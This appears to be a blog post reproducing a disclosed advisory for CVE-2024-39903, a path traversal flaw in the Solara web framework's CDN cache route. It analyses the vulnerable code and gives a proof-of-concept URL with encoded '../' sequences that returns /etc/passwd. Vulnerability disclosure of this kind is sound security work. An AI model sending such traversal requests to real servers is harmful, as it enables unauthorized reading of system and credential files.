---
layout: post
title:  "CVE-2024-39903: Local File Inclusion in Solara"
date:  2024-07-09 10:31:06 +0800
categories: file-overwrite
---

## Name

> CVE-2024-39903: Local File Inclusion in Solara

## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)

## Version

> 1.34.1


### Summary

A local file inclusion is present in the Solara when requesting resource files under the `/{cdn_helper.cdn_url_path}/<path:path>` route.

### Details

The endpoint [cdn](https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/flask.py#L215) is used to load resource file from cdn. However when resource file is cached, it will load files from local file system directly. 

The [`cdn` endpoint](https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/flask.py#L215):

```
@blueprint.route(f"/{cdn_helper.cdn_url_path}/<path:path>")
def cdn(path):
    if not allowed():
        abort(401)
    cache_directory = settings.assets.proxy_cache_dir
    content = cdn_helper.get_data(Path(cache_directory), path)
    mime = mimetypes.guess_type(path)
    return flask.Response(content, mimetype=mime[0])
```

The [`get_data`](https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L38) calls [`get_from_cache`](https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L24) to lookup cached files, it  concatenates `path` into `base_cache_dir` to get cached path directly and load the content afterwards. The `path` comes from the `<path:path>` part of `cdn` route. In this case, when path is `..%2f..%2f..%2f..%2f..%2fetc%2fpasswd`, attacks can use path traversal to read any files in local file system.

The function [`get_data`](https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L38) and [`get_from_cache`](https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L24)

```
def get_data(base_cache_dir: pathlib.Path, path):
    parts = path.replace("\\", "/").split("/")
    store_path = path if len(parts) != 1 else pathlib.Path(path) / "__main.js"

    content = get_from_cache(base_cache_dir, store_path)
    if content:
        return content

    url = get_cdn_url(path)
    response = requests.get(url)
    if response.ok:
        put_in_cache(base_cache_dir, store_path, response.content)
        return response.content
    else:
        logger.warning("Could not load URL: %r", url)
        raise Exception(f"Could not load URL: {url}")

def get_from_cache(base_cache_dir: pathlib.Path, path):
    cache_path = base_cache_dir / path
    try:
        logger.info("Opening cache file: %s", cache_path)
        return cache_path.read_bytes()
    except FileNotFoundError:
        pass
```

### PoC

1. Install Solara:

    ```
    pip install solara
    ```
2. Create `sol.py` following [official docs](https://github.com/widgetti/solara/tree/master?tab=readme-ov-file#first-script):
    ```
     import solara

    # Declare reactive variables at the top level. Components using these variables
    # will be re-executed when their values change.
    sentence = solara.reactive("Solara makes our team more productive.")
    word_limit = solara.reactive(10)


    @solara.component
    def Page():
        # Calculate word_count within the component to ensure re-execution when reactive variables change.
        word_count = len(sentence.value.split())

        solara.SliderInt("Word limit", value=word_limit, min=2, max=20)
        solara.InputText(label="Your sentence", value=sentence, continuous_update=True)

        # Display messages based on the current word count and word limit.
        if word_count >= int(word_limit.value):
            solara.Error(f"With {word_count} words, you passed the word limit of {word_limit.value}.")
        elif word_count >= int(0.8 * word_limit.value):
            solara.Warning(f"With {word_count} words, you are close to the word limit of {word_limit.value}.")
        else:
            solara.Success("Great short writing!")


    # The following line is required only when running the code in a Jupyter notebook:
    Page()
    ```
3. Start the solara server.

    ```
    solara run sol.py
    > Solara server is starting at http://localhost:8765
    ```

4. Open the url: `http://127.0.0.1:8765/_solara/cdn/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd`, the output is the contents of the `/etc/passwd` file:

    ```
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    ...
    ```

    ![poc](/assets/cve/solara.png)

### Impact

Any file on the backend filesystem can be read by an attacker with access to the solara server directly(If reverse proxy server such as nginx is used, the path parameter will be blocked).

## Reference

[https://github.com/widgetti/solara/security/advisories/GHSA-9794-pc4r-438w](https://github.com/widgetti/solara/security/advisories/GHSA-9794-pc4r-438w)